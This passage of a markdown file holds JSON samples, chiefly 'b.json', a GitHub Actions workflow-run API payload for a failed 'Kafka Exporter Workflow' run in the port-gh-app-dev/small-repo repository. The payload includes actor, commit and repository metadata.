		"deployments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/deployments"
	}
}
```

#### b.json

```json
{
	"id": 23206505273,
	"name": "Kafka Exporter Workflow",
	"node_id": "WFR_kwLOO-eDos8AAAAFZzcrOQ",
	"head_branch": "main",
	"head_sha": "2a2a37d898259035cd79d021c0456e5d8f2fe72d",
	"path": ".github/workflows/port-kafka.yaml",
	"display_title": "Update GitHub Actions workflow for custom properties sync",
	"run_number": 17,
	"event": "push",
	"status": "completed",
	"conclusion": "failure",
	"workflow_id": 192825736,
	"check_suite_id": 60954394653,
	"check_suite_node_id": "CS_kwDOO-eDos8AAAAOMSpAHQ",
	"url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/runs/23206505273",
	"html_url": "https://github.com/port-gh-app-dev/small-repo/actions/runs/23206505273",
	"pull_requests": [],
	"created_at": "2026-03-17T17:03:58Z",
	"updated_at": "2026-03-17T17:04:21Z",
	"actor": {
		"login": "PeyGis",
		"id": 15999660,
		"node_id": "MDQ6VXNlcjE1OTk5NjYw",
		"avatar_url": "https://avatars.githubusercontent.com/u/15999660?v=4",
		"gravatar_id": "",
		"url": "https://api.github.com/users/PeyGis",
		"html_url": "https://github.com/PeyGis",
		"followers_url": "https://api.github.com/users/PeyGis/followers",
		"following_url": "https://api.github.com/users/PeyGis/following{/other_user}",
		"gists_url": "https://api.github.com/users/PeyGis/gists{/gist_id}",
		"starred_url": "https://api.github.com/users/PeyGis/starred{/owner}{/repo}",
		"subscriptions_url": "https://api.github.com/users/PeyGis/subscriptions",
		"organizations_url": "https://api.github.com/users/PeyGis/orgs",
		"repos_url": "https://api.github.com/users/PeyGis/repos",
		"events_url": "https://api.github.com/users/PeyGis/events{/privacy}",
		"received_events_url": "https://api.github.com/users/PeyGis/received_events",
		"type": "User",
		"user_view_type": "public",
		"site_admin": false
	},
	"run_attempt": 1,
	"referenced_workflows": [],
	"run_started_at": "2026-03-17T17:03:58Z",
	"triggering_actor": {
		"login": "PeyGis",
		"id": 15999660,
		"node_id": "MDQ6VXNlcjE1OTk5NjYw",
		"avatar_url": "https://avatars.githubusercontent.com/u/15999660?v=4",
		"gravatar_id": "",
		"url": "https://api.github.com/users/PeyGis",
		"html_url": "https://github.com/PeyGis",
		"followers_url": "https://api.github.com/users/PeyGis/followers",
		"following_url": "https://api.github.com/users/PeyGis/following{/other_user}",
		"gists_url": "https://api.github.com/users/PeyGis/gists{/gist_id}",
		"starred_url": "https://api.github.com/users/PeyGis/starred{/owner}{/repo}",
		"subscriptions_url": "https://api.github.com/users/PeyGis/subscriptions",
		"organizations_url": "https://api.github.com/users/PeyGis/orgs",
		"repos_url": "https://api.github.com/users/PeyGis/repos",
		"events_url": "https://api.github.com/users/PeyGis/events{/privacy}",
		"received_events_url": "https://api.github.com/users/PeyGis/received_events",
		"type": "User",
		"user_view_type": "public",
		"site_admin": false
	},
	"jobs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/runs/23206505273/jobs",
	"logs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/runs/23206505273/logs",
	"check_suite_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/check-suites/60954394653",
	"artifacts_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/runs/23206505273/artifacts",
	"cancel_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/runs/23206505273/cancel",
	"rerun_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/runs/23206505273/rerun",
	"previous_attempt_url": null,
	"workflow_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/workflows/192825736",
	"head_commit": {
		"id": "2a2a37d898259035cd79d021c0456e5d8f2fe72d",
		"tree_id": "a7571c306ff5e43d21fe01fcaccfeba756004b8b",
		"message": "Update GitHub Actions workflow for custom properties sync",
		"timestamp": "2026-03-17T17:03:55Z",
		"author": {
			"name": "PagesCoffy",
			"email": "isaac.p.coffie@gmail.com"
		},
		"committer": {
			"name": "GitHub",
			"email": "noreply@github.com"
		}
	},
	"repository": {
		"id": 1005028258,
		"node_id": "R_kgDOO-eDog",
		"name": "small-repo",
		"full_name": "port-gh-app-dev/small-repo",
		"private": false,
		"owner": {
			"login": "port-gh-app-dev",
			"id": 216844958,
			"node_id": "O_kgDODOzKng",
			"avatar_url": "https://avatars.githubusercontent.com/u/216844958?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/port-gh-app-dev",
			"html_url": "https://github.com/port-gh-app-dev",
			"followers_url": "https://api.github.com/users/port-gh-app-dev/followers",
			"following_url": "https://api.github.com/users/port-gh-app-dev/following{/other_user}",
			"gists_url": "https://api.github.com/users/port-gh-app-dev/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/port-gh-app-dev/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/port-gh-app-dev/subscriptions",
			"organizations_url": "https://api.github.com/users/port-gh-app-dev/orgs",
			"repos_url": "https://api.github.com/users/port-gh-app-dev/repos",
			"events_url": "https://api.github.com/users/port-gh-app-dev/events{/privacy}",
			"received_events_url": "https://api.github.com/users/port-gh-app-dev/received_events",
			"type": "Organization",
			"user_view_type": "public",
			"site_admin": false
		},
		"html_url": "https://github.com/port-gh-app-dev/small-repo",
		"description": null,
		"fork": false,
		"url": "https://api.github.com/repos/port-gh-app-dev/small-repo",
		"forks_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/forks",
		"keys_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/keys{/key_id}",
		"collaborators_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/collaborators{/collaborator}",
		"teams_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/teams",
		"hooks_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/hooks",
		"issue_events_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues/events{/number}",
		"events_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/events",
		"assignees_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/assignees{/user}",
		"branches_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/branches{/branch}",
		"tags_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/tags",
		"blobs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/blobs{/sha}",
		"git_tags_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/tags{/sha}",
		"git_refs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/refs{/sha}",
		"trees_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/trees{/sha}",
		"statuses_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/statuses/{sha}",
		"languages_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/languages",
		"stargazers_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/stargazers",
		"contributors_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contributors",
		"subscribers_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/subscribers",
		"subscription_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/subscription",
		"commits_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/commits{/sha}",
		"git_commits_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/commits{/sha}",
		"comments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/comments{/number}",
		"issue_comment_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues/comments{/number}",
		"contents_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contents/{+path}",
		"compare_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/compare/{base}...{head}",
		"merges_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/merges",
		"archive_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/{archive_format}{/ref}",
		"downloads_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/downloads",
		"issues_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues{/number}",
		"pulls_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/pulls{/number}",
		"milestones_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/milestones{/number}",
		"notifications_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/notifications{?since,all,participating}",
		"labels_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/labels{/name}",
		"releases_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/releases{/id}",
		"deployments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/deployments"
	},
	"head_repository": {
		"id": 1005028258,
		"node_id": "R_kgDOO-eDog",
		"name": "small-repo",
		"full_name": "port-gh-app-dev/small-repo",
		"private": false,
		"owner": {
			"login": "port-gh-app-dev",
			"id": 216844958,
			"node_id": "O_kgDODOzKng",
			"avatar_url": "https://avatars.githubusercontent.com/u/216844958?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/port-gh-app-dev",
			"html_url": "https://github.com/port-gh-app-dev",
			"followers_url": "https://api.github.com/users/port-gh-app-dev/followers",
			"following_url": "https://api.github.com/users/port-gh-app-dev/following{/other_user}",
			"gists_url": "https://api.github.com/users/port-gh-app-dev/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/port-gh-app-dev/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/port-gh-app-dev/subscriptions",
			"organizations_url": "https://api.github.com/users/port-gh-app-dev/orgs",
			"repos_url": "https://api.github.com/users/port-gh-app-dev/repos",
			"events_url": "https://api.github.com/users/port-gh-app-dev/events{/privacy}",
			"received_events_url": "https://api.github.com/users/port-gh-app-dev/received_events",
			"type": "Organization",
			"user_view_type": "public",
			"site_admin": false
		},
		"html_url": "https://github.com/port-gh-app-dev/small-repo",
		"description": null,
		"fork": false,
		"url": "https://api.github.com/repos/port-gh-app-dev/small-repo",
		"forks_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/forks",
		"keys_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/keys{/key_id}",
		"collaborators_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/collaborators{/collaborator}",
		"teams_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/teams",
		"hooks_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/hooks",
		"issue_events_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues/events{/number}",
		"events_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/events",
		"assignees_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/assignees{/user}",
		"branches_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/branches{/branch}",
		"tags_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/tags",
		"blobs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/blobs{/sha}",
		"git_tags_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/tags{/sha}",
		"git_refs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/refs{/sha}",
		"trees_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/trees{/sha}",
		"statuses_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/statuses/{sha}",
		"languages_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/languages",
		"stargazers_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/stargazers",
		"contributors_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contributors",
		"subscribers_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/subscribers",
		"subscription_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/subscription",
		"commits_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/commits{/sha}",
		"git_commits_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/commits{/sha}",
		"comments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/comments{/number}",
		"issue_comment_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues/comments{/number}",
		"contents_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contents/{+path}",
		"compare_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/compare/{base}...{head}",
		"merges_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/merges",
		"archive_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/{archive_format}{/ref}",
		"downloads_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/downloads",
		"issues_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues{/number}",
		"pulls_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/pulls{/number}",
		"milestones_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/milestones{/number}",
		"notifications_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/notifications{?since,all,participating}",
		"labels_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/labels{/name}",
		"releases_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/releases{/id}",
		"deployments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/deployments"
	},
	"__repository": "small-repo",
	"__organization": "port-gh-app-dev"
}
```

